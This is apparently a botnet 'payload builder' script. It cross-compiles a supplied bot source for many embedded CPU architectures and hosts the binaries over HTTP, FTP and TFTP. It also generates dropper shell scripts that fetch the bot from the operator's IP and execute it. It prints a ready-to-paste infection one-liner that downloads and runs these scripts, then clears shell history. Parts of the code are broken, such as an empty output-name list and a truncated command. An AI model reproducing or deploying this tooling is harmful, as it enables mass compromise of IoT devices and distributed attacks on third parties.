import subprocess, sys

# check if ip address is provided as a command line argument
if len(sys.argv[2]) != 0:
    ip = sys.argv[2]
else:
    print("\x1b[0;36mIncorrect Usage!")
    print("\x1b[0;35mUsage: python " + sys.argv[0] + " <BOTNAME.C> <IPADDR> \x1b[0m")
    exit(1)

# function to run shell commands
def run(cmd):
    subprocess.call(cmd, shell=True)

# get bot filename from arguments
bot = sys.argv[1]

# ask user if they want to fetch architecture compilers
torrer = raw_input("Y/n Get Arch-")
get_arch = torrer.lower() == "y"

# compiler names and corresponding download URLs
compileas = []

getarch = [
    'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2',
    'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2',
'http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2',
'https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2',
'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2',
'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2'
]

# compiler names
ccs = ["cross-compiler-mips",
       "cross-compiler-mipsel",
       "cross-compiler-sh4",
       "cross-compiler-x86_64",
       "cross-compiler-armv6l",
       "cross-compiler-i686",
       "cross-compiler-powerpc",
       "cross-compiler-i586",
       "cross-compiler-m68k",
       "cross-compiler-armv7l",
       "cross-compiler-armv4l",
       "cross-compiler-armv5l"]

# clear tftpboot and ftp directories
run("/var/lib/tftpboot/* /var/ftp/*")

# download and set up compilers if requested
if get_arch:
    for arch in getarch:
        run("wget " + arch + " --no-check-certificate >> /dev/null")
        run("tar -xvf *tar.bz2")
        run("rm -rf *tar.bz2")

# compile bot for each architecture
num = 0
for cc in ccs:
    arch = cc.split("-")[2]
    run("./" + cc + "/bin/" + arch + "-gcc -static -pthread -D" + arch.upper() + " -o " + compileas[num] + " " + bot + " > /dev/null")
    num += 1

# setup http and tftp services
run("yum install httpd -y")
run("service httpd start")
run("service httpd start")
run("yum install xinetd tftp tftp-server -y")
run("yum install vsftpd -y")
run("service vsftpd start")

# setup tftp service
run('''echo -e "# default: off\n
service tftp\n
{\n
    socket_type             = dgram\n
    protocol                = udp\n
    wait                    = yes\n
    user                    = root\n
    server                  = /usr/sbin/in.tftpd\n
    server_args             = -s -c /var/lib/tftpboot\n
    disable                 = no\n
    per_source              = 11\n
    cps                     = 100 2\n
    flags                   = IPv4\n
}\n
" > /etc/xinetd.d/tftp''')

# ... other service configurations ...
run("service xinetd start")

run('''echo -e "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart")

# move compiled bots to web and tftp directories
for i in compileas:
    run("cp " + i + " /var/www/html")
    run("cp " + i + " /var/ftp")
    run("mv " + i + " /var/lib/tftpboot")

# create shell scripts for deployment
run('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp1.sh')
run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp1.sh')

run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp1.sh')

run('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp2.sh')

run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp2.sh')

run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp2.sh')

run('echo -e "#!/bin/bash" > /var/www/html/terror.sh')

for i in compileas:
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/terror.sh')
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' ' + i + ' ' + i + '; chmod 777 ' + i + ' ./' + i + '; rm -rf ' + i + '" >> /var/ftp/ftp1.sh')
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1.sh')
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh')
run("service xinetd restart")
run("service httpd restart")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')


# print payload for later use
print("\x1b[0;96mpay: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/terror.sh; chmod 777 *; sh terror.sh; tftp -g " + ip + " -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c\x1b[0m")
